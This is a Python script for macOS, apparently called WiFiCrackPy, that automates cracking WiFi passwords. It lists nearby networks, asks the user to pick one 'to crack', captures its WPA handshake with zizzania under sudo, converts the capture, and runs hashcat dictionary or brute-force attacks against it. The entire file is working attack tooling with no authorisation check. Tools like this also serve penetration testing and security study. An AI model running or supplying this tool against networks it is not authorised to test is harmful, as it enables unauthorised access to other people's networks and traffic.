import subprocess, re, argparse, CoreWLAN, CoreLocation
from os.path import expanduser, join
from prettytable import PrettyTable
from pyfiglet import Figlet
from time import sleep

f = Figlet(font='big')
print('\n' + f.renderText('WiFiCrackPy'))

# Define paths
hashcat_path = join(expanduser('~'), 'hashcat', 'hashcat')
zizzania_path = join(expanduser('~'), 'zizzania', 'src', 'zizzania')

# Parse arguments
parser = argparse.ArgumentParser()
parser.add_argument('-w')
parser.add_argument('-m')
parser.add_argument('-i')
parser.add_argument('-p')
parser.add_argument('-d', action='store_false')
parser.add_argument('-o', action='store_true')
args = parser.parse_args()

# Initialise CoreLocation
print('Obtaining authorisation for location services (required for WiFi scanning)...')
location_manager = CoreLocation.CLLocationManager.alloc().init()
location_manager.startUpdatingLocation()

# Wait for location services to be authorised
max_wait = 60
for i in range(1, max_wait):
    authorization_status = location_manager.authorizationStatus()
    if authorization_status == 3 or authorization_status == 4:
        print('Received authorisation, continuing...')
        break
    if i == max_wait-1:
        exit('Unable to obtain authorisation, exiting...')
    sleep(1)

# Get the default WiFi interface
cwlan_client = CoreWLAN.CWWiFiClient.sharedWiFiClient()
cwlan_interface = cwlan_client.interface()

def colourise_rssi(rssi):
    if rssi > -60:
        # Green for strong signal
        return f"\033[92m{rssi}\033[0m"
    elif rssi > -80:
        # Yellow for moderate signal
        return f"\033[93m{rssi}\033[0m"
    else:
        # Red for weak signal
        return f"\033[91m{rssi}\033[0m"

def scan_networks():
    print('\nScanning for networks...\n')

    # Scan for networks
    scan_results, _ = cwlan_interface.scanForNetworksWithName_error_(None, None)

    # Parse scan results and display in a table
    table = PrettyTable(['Number', 'Name', 'BSSID', 'RSSI', 'Channel', 'Security'])
    networks = []

    if scan_results is not None:
        for i, result in enumerate(scan_results):
            # Store relevant network information
            network_info = {
                'ssid': result.ssid(),
                'bssid': result.bssid(),
                'rssi': result.rssiValue(),
                'channel_object': result.wlanChannel(),
                'channel_number': result.channel(),
                'security': re.search(r'security=(.*?)(,|$)', str(result)).group(1)
            }
            networks.append(network_info)

         # Sort networks by RSSI value, descending
        networks_sorted = sorted(networks, key=lambda x: x['rssi'], reverse=True)

        # Add sorted networks to table
        for i, network in enumerate(networks_sorted):
            coloured_rssi = colourise_rssi(network['rssi'])
            table.add_row([i + 1, network['ssid'], network['bssid'], coloured_rssi, network['channel_number'], network['security']])
    else:
        print("No networks found or an error occurred.")
        quit()

    print(table)

    # Ask user to select a network to crack
    x = int(input('\nSelect a network to crack: ')) - 1
    capture_network(networks_sorted[x]['bssid'], networks_sorted[x]['channel_object'])


def capture_network(bssid, channel):
    # Dissociate from the current network
    cwlan_interface.disassociate()

    # Set the channel
    cwlan_interface.setWLANChannel_error_(channel, None)

    # Determine the network interface
    if args.i is None:
        iface = cwlan_interface.interfaceName()
    else:
        iface = args.i

    print('\nInitiating zizzania to capture handshake...\n')

    # Use zizzania to capture the handshake
    subprocess.run(['sudo', zizzania_path, '-i', iface, '-b', bssid, '-w', 'capture.pcap', '-q'] + ['-n'] * args.d)

    # Convert the capture to hashcat format
    subprocess.run(['hcxpcapngtool', '-o', 'capture.hc22000', 'capture.pcap'], stdout=subprocess.PIPE)

    print('\nHandshake ready for cracking...\n')

    crack_capture()


def crack_capture():
    # Ask user to select a cracking method from menu
    if args.m is None:
        options = PrettyTable(['Number', 'Mode'])
        for i, mode in enumerate(['Dictionary', 'Brute-force', 'Manual']):
            options.add_row([i + 1, mode])
        print(options)
        method = int(input('\nSelect an attack mode: '))
    else:
        method = int(args.m)

    # Get the wordlist
    if method == 1 and args.w is None:
        wordlist = input('\nInput a wordlist path: ')
    elif method == 1 and args.w is not None:
        wordlist = args.w

    # Run hashcat against the capture
    if method == 1:
        subprocess.run([hashcat_path, '-m', '22000', 'capture.hc22000', wordlist] + ['-O'] * args.o)
    elif method == 2:
        # Get the brute-force pattern
        if args.p is None:
            pattern = input('\nInput a brute-force pattern: ')
        else:
            pattern = args.p
        subprocess.run([hashcat_path, '-m', '22000', '-a', '3', 'capture.hc22000', pattern] + ['-O'] * args.o)
    else:
        print('\nRun hashcat against: capture.hc22000')


scan_networks()
